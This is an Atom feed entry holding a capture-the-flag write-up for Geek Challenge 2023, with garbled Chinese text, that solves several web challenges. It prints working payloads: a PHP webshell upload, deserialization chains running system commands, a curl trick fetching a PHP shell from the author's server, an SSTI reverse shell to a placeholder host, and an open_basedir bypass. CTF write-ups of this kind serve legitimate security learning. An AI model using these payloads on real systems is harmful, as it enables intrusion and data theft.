<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lazzaro</title>
  
  
  <link href="https://lazzzaro.github.io/atom.xml" rel="self"/>
  
  <link href="https://lazzzaro.github.io/"/>
  <updated>2023-11-28T13:58:30.807Z</updated>
  <id>https://lazzzaro.github.io/</id>
  
  <author>
    <name>Lazzaro</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>match-Geek Challenge 2023</title>
    <link href="https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/"/>
    <id>https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/</id>
    <published>2023-11-27T10:28:02.000Z</published>
    <updated>2023-11-28T13:58:30.807Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>ç¬¬åå››å±Šæå®¢å¤§æŒ‘æˆ˜ GEEK CHALLENGE 2023â€¼ï¸<br>å¼€æ”¾æ³¨å†Œï¼š10æœˆ25æ—¥æ™š10ç‚¹<br>æ¯”èµ›æ—¶é—´ï¼š10æœˆ26æ—¥æ™š8ç‚¹-11æœˆ26æ—¥æ™š8ç‚¹<br>å¹³å°é“¾æ¥ï¼š<a href="https://game.sycsec.com/">https://game.sycsec.com/</a><br>èµ›é¢˜èŒƒå›´åŒ…æ‹¬reï¼Œwebï¼Œpwnï¼Œcryptoï¼Œmiscç­‰ç­‰ï¼Œæœ¬å±Šèµ›é¢˜è¿˜åŠ å…¥å…¨æ–°yakè¯­è¨€å…ƒç´ ï¼Œæ–¹å‘å¤šæ ·ï¼Œè¶£å‘³æ€§é«˜ã€‚<br>æœ¬å±Šæ›´å¢æ·»æ ¡å¤–æ’è¡Œæ¦œï¼Œæ ¡å¤–çš„åŒå­¦ä»¬ç»„é˜Ÿå‚ä¸ä¹Ÿèƒ½è·å¾—åæ¬¡å¥–åŠ±ï¼Œæ¬¢è¿å¤§å®¶å‰æ¥æŒ‘æˆ˜ ğŸ’ªã€‚</p><p><strong>Rank: 4</strong></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h3><blockquote><p>httpç­¾åˆ°ï¼Œç‚¹å‡»å°±é€flag <a href="http://1.117.175.65:23333/">http://1.117.175.65:23333/</a></p></blockquote><p><code>robots.txt</code> è·å–è´¦å·å¯†ç ï¼Œå†æŒ‰æ­¥éª¤ç”¨å‡ ä¸ªè¯·æ±‚å¤´å­—æ®µç»•è¿‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 1.117.175.65:23333</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Referer: sycsec.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">via: Syc.vip</span><br><span class="line">O2TAKUXX: GiveMeFlag</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 40</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=@dm1N123456r00t#</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h3><blockquote><p>æ¥ç­¾ä¸ªåˆ°å§å…ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ï¼š</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">web</span>:</span><br><span class="line">    public_eva1=<span class="string">&#x27;system&#x27;</span></span><br><span class="line">    public_interesting=<span class="string">&#x27;cat /f*&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lover</span>:</span><br><span class="line">    public_yxx=web()</span><br><span class="line">    public_QW=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">syc</span>:</span><br><span class="line">    public_cuit=lover()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(serialize(syc()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>POSTï¼š</p><p><code>url=O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;</code></p><p>â€‹    </p><h3 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h3><p>æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼šMIMEã€å›¾ç‰‡å¤´ã€ç»•å…³é”®å­—</p><p>æ„é€ è¯·æ±‚å¤´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a&lt;?=system($_GET[x]);</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—® <code>uploadtest/378845_653a63ea1370a.php?x=cat /flag</code> æ‹¿flagã€‚</p><p>â€‹    </p><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><blockquote><p>å­¦äº†phpäº†ï¼Œé‚£å°±æ¥çœ‹çœ‹è¿™äº›ç»•è¿‡å§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>] !== <span class="string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>]) &lt; <span class="number">2023</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>] + <span class="number">1</span>) &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$array1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>];</span><br><span class="line">            <span class="variable">$array2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$array1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$array2</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="string">&quot;Happy to see you!&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;å†ç»•æœ€åä¸€æ­¥å§&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å¥½å“©ï¼Œå¿«æ‹¿åˆ°flagå•¦&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è¿™é‡Œç»•ä¸è¿‡å»ï¼ŒQWå¯ä¸ç­”åº”äº†å“ˆ&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å˜¿å˜¿å˜¿ï¼Œä½ åˆ«æ€¥å•Š&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸ä¼šå§ä¸ä¼šå§ï¼Œä¸ä¼šç¬¬ä¸€æ­¥å°±å¡ä½äº†å§ï¼Œyxxä¼šç§ä¸èµ·ä½ çš„ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç¬¬1å±‚ï¼šæ¢è¡Œç¬¦ç»•è¿‡ï¼›</p><p>ç¬¬2å±‚ï¼šç§‘å­¦è®¡æ•°æ³•ç»• <code>intval()</code>ï¼›</p><p>ç¬¬3å±‚ï¼šsha1ç¢°æ’ï¼›</p><p>ç¬¬4å±‚ï¼šPHPè§£æç‰¹æ€§ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?syc=Welcome%20to%20GEEK%202023!%0a&amp;lover=2e5 HTTP/1.1</span><br><span class="line">Host: h2y55ia9rcbaswjlhegv0qonf.node.game.sycsec.com</span><br><span class="line">Content-Length: 1320</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">qw=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;yxx=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;SYC[GEEK.2023=Happy to see you!</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ctf-curl"><a href="#ctf-curl" class="headerlink" title="ctf_curl"></a>ctf_curl</h3><blockquote><p>å‘½ä»¤æ‰§è¡Œï¼ŸçœŸçš„å—ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment">// curl your domain</span></span><br><span class="line"><span class="comment">// flag is in /tmp/Syclover</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|f|:|\||\&amp;|!|&gt;|&lt;|`|\(|&#123;|\?|\n|\r/i&quot;</span>, <span class="variable">$address</span>))&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&gt; /dev/null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>åˆ©ç”¨VPSå’Œcurlå†™æ–‡ä»¶çš„å‚æ•°ï¼š</p><p><code>?addr=-O%201.php%20x.x.x.x/1.txt</code></p><p>å…¶ä¸­ <code>1.txt</code> å†…å®¹ä¸ºï¼š<code>&lt;?php system(&quot;cat /tmp/Syclover&quot;);?&gt;</code></p><p>è®¿é—® <code>1.php</code> å¾—flagã€‚</p><p>â€‹    </p><h3 id="klf-ssti"><a href="#klf-ssti" class="headerlink" title="klf_ssti"></a>klf_ssti</h3><blockquote><p>De1tyçš„å¹¿ä¸œæœ‹å‹è·Ÿå¥³ç¥è¡¨ç™½è¢«éª‚klfï¼Œç°åœ¨æ°”æ€¥è´¥åï¼Œä½ çŸ¥é“klfæ˜¯ä»€ä¹ˆæ„æ€å˜›ï¼Ÿä»–ç°åœ¨ä¾æ—§è§‰å¾—ä»–ä¸æ˜¯klfä½ ä»¬æ‰æ˜¯ï¼Œä½ èƒ½æ‹¿åˆ°flagè¯æ˜ä»–æ˜¯klfå˜›â€¦</p></blockquote><p>è·¯ç”±ï¼š<code>/hack?klf=xxx</code></p><p>æ— è¿‡æ»¤ï¼Œä½†ä¹Ÿæ— è¾“å‡ºçš„SSTIç›²æ‰“ï¼Œåˆ©ç”¨pythonåå¼¹shellåˆ°VPSï¼š</p><p><code>/hack?klf=&#123;%print(config.__class__.__init__.__globals__['os'].popen('python3 -c \'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("x.x.x.x",7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\' ').read())%&#125;</code></p><p>åœ¨æ ¹ç›®å½•æ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h3 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h3><blockquote><p>æˆ‘æƒ³è¦å›ç‚‰é‡é€ ä¸€æ³¢ï¼Œæ€ä¹ˆè¯´ï¼Œéš¾é“ä½ ä¸æƒ³å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;lover);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lover/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;å¿«æ¥ç©å¿«æ¥ç©~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>ååºåˆ—åŒ–ï¼Œç”¨ <code>S</code> ç»•å…³é”®å­—è¿‡æ»¤ï¼Œå»æœ€åå¤§æ‹¬å·ç»• <code>Exception</code>ã€‚</p><p>å‘ç°è¯»ä¸å‡ºæ ¹ç›®å½•flagå€¼ï¼Œå­˜åœ¨open_basedirï¼Œåˆ©ç”¨ç»•è¿‡å‘½ä»¤è¯»ï¼š</p><p><code>/?web=O:3:&quot;syc&quot;:1:&#123;S:5:&quot;\6cover&quot;;s:142:&quot;mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);readgzfile(&#39;/f1ger&#39;);&quot;;</code></p><p>â€‹    </p><h3 id="ez-path"><a href="#ez-path" class="headerlink" title="ez_path"></a>ez_path</h3><blockquote><p>å¿«æ¥joinæˆ‘çš„åšå®¢å§ï¼</p></blockquote><p>æºç æ³¨é‡Šï¼š<code>&lt;!--secretåœ¨æ ¹ç›®å½•f14444æ–‡ä»¶é‡Œé¢ï¼Œåˆ«å¿˜è®°äº†--&gt;</code>ã€‚</p><p>é¦–é¡µå¾—åˆ°æ³„éœ²çš„æ–‡ä»¶ <code>app.cpython-39.pyc</code>ï¼Œåç¼–è¯‘å¾—pythonæºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">ARTICLES_FOLDER = <span class="string">&#x27;articles/&#x27;</span></span><br><span class="line">articles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Article</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, article_id, title, content</span>):</span><br><span class="line">        self.article_id = article_id</span><br><span class="line">        self.title = title</span><br><span class="line">        self.content = content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_article_id</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, articles=articles)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        title = request.form[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        content = request.form[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        article_id = generate_article_id()</span><br><span class="line">        article = Article(article_id, title, content)</span><br><span class="line">        articles.append(article)</span><br><span class="line">        save_article(article_id, title, content)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 